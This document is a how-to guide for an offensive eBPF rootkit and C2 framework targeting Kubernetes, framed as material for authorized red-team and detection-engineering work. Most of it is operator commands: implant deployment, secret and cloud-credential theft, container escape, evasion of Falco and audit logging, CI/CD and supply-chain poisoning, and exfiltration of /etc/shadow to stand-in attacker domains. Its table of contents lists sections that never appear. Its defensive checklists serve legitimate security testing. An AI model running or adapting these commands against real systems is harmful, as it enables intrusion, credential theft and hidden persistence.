# KubeDagger — Use Cases & How-To Guide

## Table of Contents

- [Overview](#overview)
- [Who Is This For](#who-is-this-for)
- [Core Concepts](#core-concepts)
  - [eBPF Rootkit Engine](#ebpf-rootkit-engine)
  - [HTTP/2 C2 Framework](#http2-c2-framework)
  - [Module System](#module-system)
  - [Operator Model](#operator-model)
- [Use Case 1: Red Team Kubernetes Penetration Test](#use-case-1-red-team-kubernetes-penetration-test)
- [Use Case 2: Cloud-Native Security Assessment](#use-case-2-cloud-native-security-assessment)
- [Use Case 3: Detection Engineering & Blue Team Validation](#use-case-3-detection-engineering--blue-team-validation)
- [Use Case 4: Multi-Cluster Lateral Movement Simulation](#use-case-4-multi-cluster-lateral-movement-simulation)
- [Use Case 5: Supply Chain Attack Simulation](#use-case-5-supply-chain-attack-simulation)
- [Use Case 6: Covert Channel Research](#use-case-6-covert-channel-research)
- [Use Case 7: CI/CD Pipeline Security Testing](#use-case-7-cicd-pipeline-security-testing)
- [Use Case 8: Service Mesh Security Validation](#use-case-8-service-mesh-security-validation)
- [Use Case 9: Autonomous Objective Campaigns](#use-case-9-autonomous-objective-campaigns)
- [Use Case 10: Cloud Provider Exploitation Testing](#use-case-10-cloud-provider-exploitation-testing)
- [Architecture Deep Dive](#architecture-deep-dive)
- [MITRE ATT&CK Coverage](#mitre-attck-coverage)
- [Deployment Scenarios](#deployment-scenarios)
- [Operational Security Considerations](#operational-security-considerations)
- [Frequently Asked Questions](#frequently-asked-questions)

---

## Overview

KubeDagger is an eBPF-based offensive security research tool with a cross-platform HTTP/2 command-and-control (C2) framework. It demonstrates 57+ offensive techniques spanning the full Kubernetes attack lifecycle — from initial access and privilege escalation through lateral movement, data exfiltration, and persistence.

**Purpose:** Authorized security testing, red team operations, detection engineering validation, and educational research in cloud-native environments.

**Key capabilities:**
- Kernel-level stealth via eBPF (Linux)
- Cross-platform C2 (Linux, Windows, macOS)
- 57+ offensive techniques with MITRE ATT&CK mapping
- Autonomous objective-driven campaign planning
- Multi-cluster propagation
- Cloud provider exploitation (AWS, GCP, Azure)
- CI/CD pipeline poisoning
- Service mesh deep attacks

---

## Who Is This For

| Role | Use Case |
|------|----------|
| **Red Team Operators** | Simulate advanced persistent threats in Kubernetes clusters |
| **Penetration Testers** | Validate Kubernetes security posture and identify attack paths |
| **Detection Engineers** | Generate realistic attack telemetry to test SIEM/EDR/CNAPP rules |
| **Security Researchers** | Study eBPF-based offensive techniques and covert channels |
| **CTF Players** | Practice cloud-native attack and defense scenarios |
| **Security Architects** | Understand attack surfaces to design better defenses |
| **DevSecOps Teams** | Validate that security controls actually stop real attacks |

---

## Core Concepts

### eBPF Rootkit Engine

The eBPF engine is the Linux-only kernel-level component. It loads BPF programs into the kernel via kprobes, uprobes, tracepoints, XDP, and TC hooks to achieve:

- **Stealth:** Hide processes, files, network connections, and BPF programs from userspace
- **Interception:** Capture file reads, network traffic, TLS plaintext, and credentials
- **Manipulation:** Override Docker images, modify DNS responses, inject pipe programs
- **Persistence:** Survive reboots via systemd or cron, hidden from filesystem utilities

```
┌─────────────────────────────────────────────────────┐
│                    Kernel Space                       │
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐          │
│  │ kprobes  │  │ uprobes  │  │   XDP    │          │
│  │(syscalls)│  │(SSL r/w) │  │(packets) │          │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘          │
│       │              │              │                │
│       ▼              ▼              ▼                │
│  ┌──────────────────────────────────────────┐       │
│  │           BPF Maps (shared state)         │       │
│  │  - http_routes  - dns_table               │       │
│  │  - piped_progs  - comm_prog_key           │       │
│  └──────────────────────────────────────────┘       │
└─────────────────────────────────────────────────────┘
         ▲                              │
         │ (commands)                   │ (data)
         │                              ▼
┌─────────────────────────────────────────────────────┐
│                    User Space                         │
│                                                      │
│  kubedagger (daemon)  ◄──HTTP──►  kubedagger-client  │
└─────────────────────────────────────────────────────┘
```

**Key requirements:**
- Linux kernel 5.4+ with BTF (BPF Type Format) enabled
- Root or `CAP_BPF` + `CAP_NET_ADMIN`
- clang/llvm 11+ for compiling eBPF C programs

### HTTP/2 C2 Framework

The C2 framework operates independently of eBPF and supports cross-platform implants. It uses HTTP/2 with mutual TLS (mTLS) for agent-server communication.

```
┌─────────────────┐     HTTP/2 + mTLS     ┌─────────────────┐
│   C2 Server     │◄────────────────────►  │     Agent       │
│                 │                         │                 │
│ - Agent registry│  Endpoints:            │ - Beacon loop   │
│ - Task queue    │  POST /checkin         │ - Module runner  │
│ - Mgmt port     │  POST /task            │ - Shell exec    │
│   (9443)        │  POST /result          │ - Auto-retry    │
└────────┬────────┘                         └─────────────────┘
         │
         │ ChaCha20-Poly1305
         │ encrypted TCP
         ▼
┌─────────────────┐
│  Operator CLI   │
│                 │
│ agents / shell  │
│ module / tasks  │
│ status          │
└─────────────────┘
```

**Transport security:**
- mTLS with certificate pinning (production)
- ChaCha20-Poly1305 AEAD for management channel
- 30-second beacon interval with ±20% jitter
- Exponential backoff on failures

### Module System

Modules are specialized attack capabilities built into the agent. They execute without requiring shell commands and are platform-aware.

| Category | Modules |
|----------|---------|
| **Reconnaissance** | `k8s_discovery`, `cloud_metadata`, `honeypot_detect` |
| **Credential Access** | `sa_token`, `cloud_exploit` |
| **Lateral Movement** | `multi_cluster`, `memexec` |
| **Persistence** | `webhook_deploy`, `crd_backdoor` |
| **Evasion** | `cloud_evasion`, `polymorph`, `antiforensics` |
| **Exfiltration** | `dns_exfil`, `covert_channel` |
| **Impact** | `cicd_poison`, `service_mesh` |
| **Autonomous** | `autonomy` (goal-directed campaign planner) |

### Operator Model

KubeDagger follows a three-tier operational model:

1. **Server** — Central C2 infrastructure, manages agents and task queues
2. **Agent** — Deployed on targets, executes tasks, reports results
3. **Operator** — Human interface (CLI or Web UI) for managing the operation

The operator never directly touches targets. All interaction flows through the server's task queue, providing operational separation and audit trails.

---

## Use Case 1: Red Team Kubernetes Penetration Test

### Scenario
You have gained initial access to a pod in a production Kubernetes cluster (e.g., via an RCE vulnerability in a web application). Your objective is to demonstrate the full blast radius: escalate privileges, move laterally, access sensitive data, and establish persistence.

### Phase 1: Initial Foothold & Reconnaissance

```shell
# Deploy the agent on the compromised pod
./kubedagger-agent-linux -server https://c2.redteam.internal:443 \
  -ca ca.pem -cert agent.pem -key agent-key.pem

# From operator workstation — verify agent registration
./kubedagger-operator -key $KEY agents
```

**Expected output:**
```
ID               OS      Arch    Last Seen
agent-a1b2c3d4   linux   amd64   2s ago
```

### Phase 2: Kubernetes Cluster Enumeration

```shell
# Discover the cluster topology
./kubedagger-operator -key $KEY module agent-a1b2c3d4 k8s_discovery

# Extract service account token
./kubedagger-operator -key $KEY module agent-a1b2c3d4 sa_token

# Detect if this is a honeypot
./kubedagger-operator -key $KEY module agent-a1b2c3d4 honeypot_detect
```

**What you learn:**
- Namespaces, pods, services, and their network topology
- Which containers are privileged or have `hostPID`/`hostNetwork`
- Service account permissions and RBAC misconfigurations
- Whether the environment shows honeypot indicators

### Phase 3: Privilege Escalation

```shell
# Attempt container escape
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client escape --action detect"

# If privileged container detected:
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client escape --action execute --technique privileged"

# Escalate K8s privileges using RBAC abuse
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client k8s abuse --action escalate"
```

### Phase 4: Credential Harvesting & Lateral Movement

```shell
# Harvest all available secrets
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client secrets harvest --sources all"

# Steal cloud metadata credentials
./kubedagger-operator -key $KEY module agent-a1b2c3d4 cloud_metadata

# Pivot to other clusters via stolen kubeconfigs
./kubedagger-operator -key $KEY module agent-a1b2c3d4 multi_cluster action=discover
```

### Phase 5: Persistence & Stealth

```shell
# Deploy as DaemonSet for cluster-wide access
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client daemonset --action deploy --image kube-health:latest \
   --name kube-health --namespace kube-system"

# Evade runtime security (Falco/Tetragon)
./kubedagger-operator -key $KEY module agent-a1b2c3d4 cloud_evasion action=falco technique=symlink

# Hide from audit logs
./kubedagger-operator -key $KEY module agent-a1b2c3d4 antiforensics action=suppress_audit pid=$$
```

### Phase 6: Data Exfiltration

```shell
# If HTTP egress is blocked, use DNS exfiltration
./kubedagger-operator -key $KEY module agent-a1b2c3d4 dns_exfil \
  domain=data.redteam.internal data="$(cat /tmp/secrets.json | base64)"

# Or use covert channels
./kubedagger-operator -key $KEY module agent-a1b2c3d4 covert_channel \
  channel=icmp target=10.0.2.1 data=exfildata
```

### Phase 7: Reporting

```shell
# Generate MITRE ATT&CK mapping of all techniques used
./kubedagger-operator -key $KEY shell agent-a1b2c3d4 \
  "kubedagger-client mitre export --format json -o /tmp/attack_layer.json"
```

### Deliverable
Import the ATT&CK Navigator JSON layer to visualize coverage, then map each technique to the specific findings (secrets accessed, escape vectors, RBAC misconfigurations).

---

## Use Case 2: Cloud-Native Security Assessment

### Scenario
A security team needs to validate that their defense-in-depth controls actually work: network policies, pod security standards, runtime detection (Falco), image signing, and cloud IAM boundaries.

### How-To: Validate Network Policy Enforcement

```shell
# Test if network policies block lateral movement
kubedagger-client netbypass --mode tunnel --dest-ip 10.0.5.3 --dest-port 443
kubedagger-client netbypass --mode spoof --dest-ip 10.0.5.3 --dest-port 80
kubedagger-client netbypass --mode encap --dest-ip 10.0.5.3 --dest-port 8080
kubedagger-client netbypass --mode direct --dest-ip 10.0.5.3 --dest-port 443
```

**Expected findings:**
- `tunnel` succeeds → policy doesn't inspect encapsulated traffic
- `spoof` succeeds → policy relies on source IP which can be spoofed
- `direct` succeeds → XDP bypass skips TC-level policy enforcement

### How-To: Validate Runtime Detection

```shell
# Attempt to evade Falco
kubedagger-client evasion --mode falco

# Verify if container escape is detected
kubedagger-client escape --action execute --technique cgroup

# Check if file access triggers alerts
kubedagger-client fs_watch add /etc/shadow --active
```

**Assessment criteria:**
- Did Falco generate an alert for each action?
- What was the detection latency?
- Were any techniques completely invisible?

### How-To: Validate Image Signing

```shell
# Attempt to bypass Sigstore/Cosign verification
kubedagger-client sig-bypass --mode inject-sig --target-image webapp:latest
kubedagger-client sig-bypass --mode disable-verify --target-image api:v1
```

### How-To: Validate Cloud IAM Boundaries

```shell
# Test if IMDS is accessible from pods
kubedagger-client cloud meta --provider auto

# Test if pod can exfiltrate to external buckets
kubedagger-client cloud exfil --provider aws --bucket test-exfil \
  --file /etc/hostname --creds-from meta
```

**Remediation guidance based on findings:**
| Finding | Remediation |
|---------|-------------|
| IMDS accessible | Enable IMDSv2 with hop limit 1 |
| Network policy bypass via XDP | Use CNI with XDP-level enforcement (Cilium) |
| Falco evaded | Update rule sets, deploy kernel-level immutable sensors |
| Image signing bypassed | Enforce OPA/Gatekeeper with image verification |

---

## Use Case 3: Detection Engineering & Blue Team Validation

### Scenario
A detection engineering team wants to create and validate detection rules for eBPF-based rootkits, covert C2 channels, and Kubernetes-native attacks.

### How-To: Generate Attack Telemetry

**Step 1: Set up a test cluster with observability**
```shell
# Ensure Falco, Tetragon, or your SIEM agent is running
# Deploy KubeDagger in the test cluster

# Start the eBPF daemon
sudo ./bin/kubedagger -i eth0 -e eth0 --disable-bpf-obfuscation
```

**Step 2: Execute techniques and observe detection gaps**

```shell
# Technique: Process hiding (should trigger getdents64 hook detection)
kubedagger-client syscall-bypass --hide-pids "1234"

# Technique: DNS exfiltration (should trigger anomaly detection)
kubedagger-client dns_exfil --file /etc/passwd --domain test.internal

# Technique: Kernel keyring access (should trigger keyctl monitoring)
kubedagger-client keyring --mode dump --key-type user

# Technique: Container escape (should trigger capability/namespace alerts)
kubedagger-client escape --action execute --technique privileged

# Technique: Admission webhook deployment (should trigger API audit)
kubedagger-client webhook --action deploy --namespace default --image test:v1
```

**Step 3: Map detections to techniques**

| KubeDagger Technique | Expected Detection Source | Detection Rule |
|---------------------|--------------------------|----------------|
| `syscall-bypass` | Falco (syscall monitor) | Anomalous getdents64 modifications |
| `dns_exfil` | DNS logs / SIEM | High-entropy subdomain queries |
| `keyring --mode dump` | auditd / Tetragon | keyctl syscall from non-standard process |
| `escape --technique privileged` | Falco | Container breakout via mount namespace |
| `webhook --action deploy` | K8s audit log | MutatingWebhookConfiguration creation |

**Step 4: Write and validate detection rules**

Example Falco rule for DNS exfiltration:
```yaml
- rule: Suspicious DNS Query Pattern
  desc: Detects base32-encoded subdomain labels typical of DNS exfiltration
  condition: >
    evt.type = sendto and fd.l4proto = udp and fd.sport = 53 and
    evt.arg.data contains_base32_pattern
  output: "DNS exfiltration attempt (proc=%proc.name query=%fd.name)"
  priority: WARNING
```

### How-To: Validate Alert Fatigue Resistance

```shell
# Poison observability to test if SOC can differentiate real vs noise
kubedagger-client obs-poison --target-system prometheus \
  --endpoint http://prometheus:9090 --strategy noise

kubedagger-client obs-poison --target-system otel \
  --endpoint http://otel-collector:4317 --strategy fatigue
```

**Assessment:** Can the SOC team identify the real attack signal through the noise? Does the SIEM correlate the observability poisoning as a precursor to a larger attack?

---

## Use Case 4: Multi-Cluster Lateral Movement Simulation

### Scenario
An organization runs multiple Kubernetes clusters (dev, staging, production) connected via service mesh federation or shared credentials. Validate that compromise of one cluster doesn't cascade.

### How-To

**Step 1: Establish foothold in Cluster A (dev)**

```shell
# Agent deploys in dev cluster
./kubedagger-agent-linux -server https://c2.internal:443 -id cluster-a-agent \
  -ca ca.pem -cert agent.pem -key agent-key.pem
```

**Step 2: Discover pivot paths**

```shell
# Find kubeconfigs and cross-cluster credentials
./kubedagger-operator -key $KEY module cluster-a-agent multi_cluster action=discover
```

**What to look for:**
- Kubeconfig files in `~/.kube/` or mounted as secrets
- Federation API server endpoints
- Service mesh trust domains shared across clusters
- Shared container registries with write access
- CI/CD service accounts with cross-cluster permissions

**Step 3: Pivot to Cluster B**

```shell
# Use discovered kubeconfig to pivot
./kubedagger-operator -key $KEY module cluster-a-agent multi_cluster \
  action=pivot target=cluster-b

# Deploy agent in the new cluster
./kubedagger-operator -key $KEY module cluster-a-agent multi_cluster \
  action=deploy target=cluster-b
```

**Step 4: Assess blast radius**

```shell
# From the new cluster agent, discover what's accessible
./kubedagger-operator -key $KEY module cluster-b-agent k8s_discovery
./kubedagger-operator -key $KEY module cluster-b-agent cloud_metadata
```

### Findings Template

| Pivot Vector | Source Cluster | Destination | Risk |
|-------------|---------------|-------------|------|
| Shared kubeconfig in configmap | dev | staging | Critical |
| Federation API trust | staging | production | High |
| Shared registry push access | dev | production (via image pull) | Critical |
| Service mesh cross-cluster mTLS | staging | production | High |

---

## Use Case 5: Supply Chain Attack Simulation

### Scenario
Validate that image provenance, signing, admission controllers, and registry security prevent supply chain attacks.

### How-To: OCI Manifest Manipulation

```shell
# Inject a malicious layer into a trusted image
kubedagger-client supply-chain --mode layer-inject \
  --target-image "nginx:latest" --payload "/tmp/backdoor.tar"

# Replace the entire image manifest
kubedagger-client supply-chain --mode manifest-replace \
  --target-image "webapp:v1" --payload "/tmp/evil-manifest.json"
```

### How-To: CRI-Level Image Tampering

```shell
# After image is pulled but before container starts,
# modify the overlay filesystem
kubedagger-client cri-tamper --runtime containerd --mode overlay \
  --target-image nginx:latest --inject-binary /tmp/backdoor

# Replace the runc binary (affects ALL new containers)
kubedagger-client cri-tamper --runtime containerd --mode runc \
  --target-image "*" --inject-binary /tmp/evil-runc
```

### How-To: GitOps Repository Poisoning

```shell
# Target ArgoCD/Flux synced repositories
kubedagger-client gitops-poison \
  --repo "https://github.com/org/infra" \
  --target-path "deployments/webapp.yaml" \
  --inject-image "evil/webapp:latest"
```

### How-To: Image Signature Bypass

```shell
# Bypass Cosign/Sigstore verification
kubedagger-client sig-bypass --mode inject-sig --target-image webapp:latest
kubedagger-client sig-bypass --mode disable-verify --target-image api:v1
```

### Defense Validation Checklist

- [ ] Admission controller blocks unsigned images
- [ ] Binary authorization rejects modified digests
- [ ] Registry webhooks alert on layer changes
- [ ] GitOps controller validates manifest signatures
- [ ] CRI-level integrity monitoring detects overlay tampering
- [ ] runc binary hash is verified at runtime

---

## Use Case 6: Covert Channel Research

### Scenario
Research and demonstrate data exfiltration methods that bypass network monitoring, DPI, and traditional IDS/IPS.

### Available Covert Channels

| Channel | Bandwidth | Detectability | Use When |
|---------|-----------|---------------|----------|
| DNS Exfiltration | ~30 bytes/query | Medium (entropy analysis) | HTTP blocked, DNS allowed |
| DNS-over-HTTPS | ~100 bytes/query | Low (encrypted HTTPS) | DNS monitoring active |
| ICMP Payload | ~56 bytes/packet | Medium (ICMP inspection) | Only ICMP allowed |
| TCP Window Stego | 2-4 bits/packet | Very Low | Coexists with normal traffic |
| IPv4 ID Field | 16 bits/packet | Very Low | Normal-looking IP traffic |
| TCP Urgent Pointer | 16 bits/packet | Low | TCP traffic permitted |
| TTL Encoding | 6-8 bits/packet | Very Low | Any IP traffic |
| Container Log C2 | Variable | Very Low | Log collection active |
| K8s Event C2 | Variable | Very Low | K8s API access available |
| BPF Map IPC | Unlimited (local) | Undetectable (kernel) | Same-host coordination |

### How-To: DNS Exfiltration

```shell
# Standard DNS exfil (base32 in subdomain labels)
kubedagger-client dns_exfil --file /etc/shadow --domain data.attacker.com

# Receiving side: run a DNS server that logs TXT queries
# Decode: sort by sequence hex prefix, concatenate, base32-decode
```

**Protocol format:** `<seq_hex><base32_chunk>.<domain>` → terminated by `ffff.end.<domain>`

### How-To: TCP Window Steganography

```shell
# Encode data in TCP window size field via TC egress BPF
kubedagger-client tcp-stego --data "exfiltrated secrets" \
  --dest "10.0.2.5:443" --bits-per-packet 2
```

**How it works:** Modifies the TCP window size field in outgoing packets. Normal traffic continues to flow; the window size variations encode hidden data. Receiver correlates window size changes to extract the payload.

### How-To: DNS-over-HTTPS C2

```shell
# Route C2 commands through legitimate DoH providers
kubedagger-client doh-c2 --resolver cloudflare --domain "c2.example.com"
kubedagger-client doh-c2 --resolver google --domain "cmd.evil.com"
```

**Why it works:** Traffic appears as standard HTTPS to cloudflare-dns.com or dns.google — indistinguishable from legitimate DNS privacy usage.

### How-To: Container Log Steganography

```shell
# Hide C2 data in container stdout logs
kubedagger-client container-log-c2 --container "webapp" --encode whitespace
kubedagger-client container-log-c2 --container "api" --encode unicode
```

**How it works:** Encodes command/response data using invisible Unicode characters or whitespace patterns within normal-looking log lines. Log aggregators (Fluentd, Loki) collect and forward the data to the attacker's log sink.

---

## Use Case 7: CI/CD Pipeline Security Testing

### Scenario
Validate that CI/CD pipelines (Tekton, ArgoCD, Flux) are resistant to poisoning attacks that could inject malicious code into production deployments.

### How-To: Detect CI/CD Infrastructure

```shell
# Detect CI/CD platforms in the cluster
./kubedagger-operator -key $KEY module agent-id cicd_poison action=detect
```

**What it finds:**
- Tekton Pipelines installations and pipeline runs
- ArgoCD applications and sync policies
- Flux controllers and GitRepository sources
- Jenkins agents running in the cluster
- GitHub Actions runners

### How-To: Tekton Pipeline Injection

```shell
# Inject a malicious task into Tekton pipelines
./kubedagger-operator -key $KEY module agent-id cicd_poison \
  action=inject platform=tekton namespace=tekton-pipelines
```

**Attack flow:**
1. Create a malicious Tekton Task that runs alongside legitimate build steps
2. The task exfiltrates source code, injects backdoors, or steals credentials
3. Because it's a legitimate Tekton resource, it runs within the pipeline's RBAC context

### How-To: ArgoCD Application Poisoning

```shell
# Inject malicious sync into ArgoCD
./kubedagger-operator -key $KEY module agent-id cicd_poison \
  action=inject platform=argocd namespace=argocd
```

**Attack flow:**
1. Create/modify an ArgoCD Application pointing to an attacker-controlled repo
2. ArgoCD automatically syncs the malicious manifests to the target cluster
3. Resources deploy with ArgoCD's elevated permissions

### How-To: Flux Source Manipulation

```shell
# Manipulate Flux GitRepository sources
./kubedagger-operator -key $KEY module agent-id cicd_poison \
  action=inject platform=flux namespace=flux-system
```

### Defense Validation

| Control | Test | Pass Criteria |
|---------|------|---------------|
| Pipeline RBAC | Inject task with excess permissions | Task rejected by admission |
| Source verification | Modify GitRepository URL | Flux rejects unsigned source |
| Image policy | Deploy unsigned image via pipeline | Admission controller blocks |
| Audit logging | Inject malicious resources | K8s audit captures creation events |
| Network policy | Pipeline task exfiltrates data | Egress blocked by network policy |

---

## Use Case 8: Service Mesh Security Validation

### Scenario
Validate that service mesh (Istio, Linkerd) security controls — mTLS enforcement, authorization policies, and traffic management — cannot be bypassed.

### How-To: Detect Service Mesh

```shell
# Identify mesh infrastructure
./kubedagger-operator -key $KEY module agent-id service_mesh action=detect
```

**What it finds:**
- Istio control plane (istiod, pilot)
- Envoy sidecar proxies
- mTLS certificate authorities
- Authorization policies in effect
- Traffic management rules (VirtualServices, DestinationRules)

### How-To: Bypass Service Mesh Sidecar

```shell
# XDP-level bypass (processes packet before iptables redirect to sidecar)
kubedagger-client meshbypass --mode xdp --mesh-target 10.0.3.5:8080

# UID-based bypass (send as the mesh proxy UID to skip redirect)
kubedagger-client meshbypass --mode uid --mesh-target 10.0.3.5:8080

# Raw socket bypass (avoid iptables interception entirely)
kubedagger-client meshbypass --mode raw --mesh-target 10.0.3.5:8080
```

### How-To: xDS Control Plane Injection

```shell
# Inject malicious xDS configuration into Istio
./kubedagger-operator -key $KEY module agent-id service_mesh \
  action=xds_inject namespace=istio-system
```

**Impact:** Attacker-controlled routing rules direct traffic through a malicious proxy for interception.

### How-To: Steal mTLS Certificates

```shell
# Extract Istio mTLS certificates for impersonation
./kubedagger-operator -key $KEY module agent-id service_mesh \
  action=certs namespace=istio-system
```

**Impact:** With stolen certificates, an attacker can impersonate any service in the mesh.

### How-To: Traffic Hijacking

```shell
# Redirect traffic between services
./kubedagger-operator -key $KEY module agent-id service_mesh \
  action=hijack source=frontend target=backend namespace=default
```

### Defense Validation Matrix

| Attack | Control | Expected Behavior |
|--------|---------|-------------------|
| XDP bypass | Cilium with XDP-level enforcement | Bypass fails |
| UID spoofing | Strict mTLS (STRICT mode) | Connection rejected without valid cert |
| xDS injection | Istiod RBAC hardening | Unauthorized xDS push rejected |
| Cert theft | Short-lived certs (< 1h) + rotation | Stolen certs expire quickly |
| Traffic hijack | AuthorizationPolicy (source principal) | Hijacked traffic rejected |

---

## Use Case 9: Autonomous Objective Campaigns

### Scenario
Test how an advanced adversary with autonomous capabilities could chain multiple techniques to achieve a strategic objective without manual operator intervention.

### How-To: Autonomous Campaign

```shell
# Deploy autonomous objective engine
./kubedagger-operator -key $KEY module agent-id autonomy \
  objective=persist target=cluster
```

**How the autonomy module works:**

1. **Objective decomposition** — Breaks the high-level goal into sub-objectives
2. **Situation assessment** — Evaluates current access, permissions, and environment
3. **Forward-chaining planner** — Selects techniques based on available preconditions
4. **Execution** — Runs techniques in dependency order
5. **Feedback loop** — Re-assesses after each step, adapts if blocked

**Example objective: "persist"**

The planner might produce:
```
1. k8s_discovery → map cluster topology
2. sa_token → extract service account with escalation path
3. cloud_metadata → steal IAM credentials for backup access
4. webhook_deploy → install mutation webhook for new-pod persistence
5. antiforensics → suppress audit logs for persistence mechanisms
6. polymorph → mutate eBPF signatures to evade detection
```

### Available Objectives

| Objective | Description |
|-----------|-------------|
| `persist` | Establish multiple persistence mechanisms |
| `exfiltrate` | Find and exfiltrate sensitive data |
| `escalate` | Achieve cluster-admin or node-level access |
| `disrupt` | Cause targeted denial of service |
| `propagate` | Spread to additional clusters/cloud accounts |

### How-To: Monitor Autonomous Execution

```shell
# Check task status
./kubedagger-operator -key $KEY tasks agent-id

# Get detailed results from each step
./kubedagger-operator -key $KEY status <task-id>
```

### Detection Engineering Value

The autonomous engine generates realistic multi-step attack chains that test whether your detection pipeline can:
- Correlate disparate events into a single campaign
- Detect the causal chain (not just individual alerts)
- Trigger escalation when multiple low-severity events combine

---

## Use Case 10: Cloud Provider Exploitation Testing

### Scenario
Validate that cloud provider security controls (IAM boundaries, IMDS protections, VPC segmentation) prevent kubernetes-to-cloud escalation.

### How-To: AWS Exploitation

```shell
# Detect AWS environment and available attack surface
./kubedagger-operator -key $KEY module agent-id cloud_exploit action=detect

# Steal IMDS credentials
kubedagger-client cloud meta --provider aws

# Attempt IAM privilege escalation
./kubedagger-operator -key $KEY module agent-id cloud_exploit \
  action=iam_escalate provider=aws

# Exfiltrate to S3
kubedagger-client cloud exfil --provider aws --bucket test-exfil \
  --file /etc/shadow --creds-from meta
```

**AWS attack paths tested:**
- IMDSv1 credential theft (169.254.169.254)
- IAM role assumption chains
- S3 bucket exfiltration
- EC2 instance profile abuse
- EKS pod identity exploitation

### How-To: GCP Exploitation

```shell
# Detect GCP environment
./kubedagger-operator -key $KEY module agent-id cloud_exploit action=detect

# Steal GCP metadata credentials
kubedagger-client cloud meta --provider gcp

# IAM escalation
./kubedagger-operator -key $KEY module agent-id cloud_exploit \
  action=iam_escalate provider=gcp
```

**GCP attack paths tested:**
- Metadata server service account token theft
- Service account key impersonation
- GCS bucket exfiltration
- Workload Identity abuse
- GKE node service account escalation

### How-To: Azure Exploitation

```shell
# Detect Azure environment
./kubedagger-operator -key $KEY module agent-id cloud_exploit action=detect

# Steal managed identity token
kubedagger-client cloud meta --provider azure

# IAM escalation
./kubedagger-operator -key $KEY module agent-id cloud_exploit \
  action=iam_escalate provider=azure
```

**Azure attack paths tested:**
- Managed Identity token theft (IMDS)
- Azure AD service principal abuse
- Azure Blob Storage exfiltration
- AKS pod identity escalation
- Key Vault access from compromised identity

### Cloud Security Validation Checklist

- [ ] IMDSv2 enforced with hop limit = 1 (AWS)
- [ ] Workload Identity Federation configured (GCP)
- [ ] Pod identity restricted to minimum permissions (Azure)
- [ ] VPC endpoints / Private Link prevent external exfil
- [ ] Cloud audit logs capture all API calls from pods
- [ ] CSPM alerts on IAM escalation patterns
- [ ] Network policies block metadata endpoint access

---

## Architecture Deep Dive

### Component Interaction

```
┌──────────────────────────────────────────────────────────────────────┐
│                         OPERATOR LAYER                                 │
│                                                                        │
│  ┌──────────────────┐         ┌───────────────────┐                   │
│  │  Operator CLI    │         │   Web UI (8080)   │                   │
│  │ (kubedagger-     │         │ - Agent cards     │                   │
│  │  operator)       │         │ - Command form    │                   │
│  └────────┬─────────┘         │ - History view    │                   │
│           │                   └─────────┬─────────┘                   │
│           │ ChaCha20 TCP (9443)         │ REST API                    │
└───────────┼─────────────────────────────┼────────────────────────────┘
            │                             │
            ▼                             ▼
┌──────────────────────────────────────────────────────────────────────┐
│                         SERVER LAYER                                   │
│                                                                        │
│  ┌────────────────────────────────────────────────────────────────┐   │
│  │                    kubedagger-server                             │   │
│  │                                                                  │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────┐  │   │
│  │  │Agent Registry│  │  Task Queue  │  │ Mgmt Port Handler    │  │   │
│  │  │              │  │  (per-agent) │  │ (ChaCha20 + REST)    │  │   │
│  │  └──────────────┘  └──────────────┘  └──────────────────────┘  │   │
│  │                                                                  │   │
│  │  HTTP/2 Listener (:443)                                         │   │
│  │  - POST /checkin  (beacon registration)                         │   │
│  │  - POST /task     (task dispatch)                               │   │
│  │  - POST /result   (result collection)                           │   │
│  └────────────────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────────┘
            ▲
            │ HTTP/2 + mTLS (cert-pinned, TLS 1.3)
            │
            ▼
┌──────────────────────────────────────────────────────────────────────┐
│                         AGENT LAYER                                    │
│                                                                        │
│  ┌────────────────────────────────────────────────────────────────┐   │
│  │                    kubedagger-agent                              │   │
│  │                                                                  │   │
│  │  ┌──────────┐  ┌──────────────┐  ┌─────────────────────────┐  │   │
│  │  │  Beacon  │  │ Shell Exec   │  │     Module System       │  │   │
│  │  │  Loop    │  │              │  │                          │  │   │
│  │  │ (30s ±   │  │ cmd.exe /    │  │ cloud_metadata  sa_token │  │   │
│  │  │  jitter) │  │ /bin/sh      │  │ k8s_discovery   dns_exfil│  │   │
│  │  └──────────┘  └──────────────┘  │ multi_cluster  memexec  │  │   │
│  │                                   │ cicd_poison    autonomy │  │   │
│  │                                   │ service_mesh   polymorph│  │   │
│  │                                   │ cloud_evasion  ...      │  │   │
│  │                                   └─────────────────────────┘  │   │
│  └────────────────────────────────────────────────────────────────┘   │
│                                                                        │
│  ┌────────────────────────────────────────────────────────────────┐   │
│  │              eBPF Rootkit (Linux only, requires root)            │   │
│  │                                                                  │   │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────────────┐  │   │
│  │  │kprobes  │  │uprobes  │  │  XDP    │  │ TC (traffic     │  │   │
│  │  │         │  │         │  │         │  │  control)       │  │   │
│  │  │-vfs_read│  │-SSL_read│  │-packet  │  │-packet modify   │  │   │
│  │  │-getdents│  │-SSL_writ│  │ filter  │  │-stego encode    │  │   │
│  │  │-execve  │  │-connect │  │-XDP C2  │  │-ARP inject      │  │   │
│  │  │-keyctl  │  │         │  │-reverse │  │                 │  │   │
│  │  │-audit_* │  │         │  │  shell  │  │                 │  │   │
│  │  └─────────┘  └─────────┘  └─────────┘  └─────────────────┘  │   │
│  └────────────────────────────────────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────────┘
```

### Data Flow

1. **Agent → Server:** Agent beacons every 30s (±20% jitter) via `POST /checkin`
2. **Agent polls:** Agent requests tasks via `POST /task`
3. **Server → Agent:** Server responds with pending task (shell command or module invocation)
4. **Agent executes:** Runs the command or module locally
5. **Agent → Server:** Submits result via `POST /result`
6. **Operator → Server:** Queries agents/tasks/results via management port

### Security Properties

| Property | Mechanism |
|----------|-----------|
| Transport encryption | TLS 1.3 with mTLS (agent ↔ server) |
| Certificate pinning | Agent pins server cert at build time |
| Management auth | ChaCha20-Poly1305 with pre-shared 256-bit key |
| Traffic obfuscation | HTTP/2 multiplexing looks like normal web traffic |
| Beacon jitter | ±20% randomization prevents timing analysis |
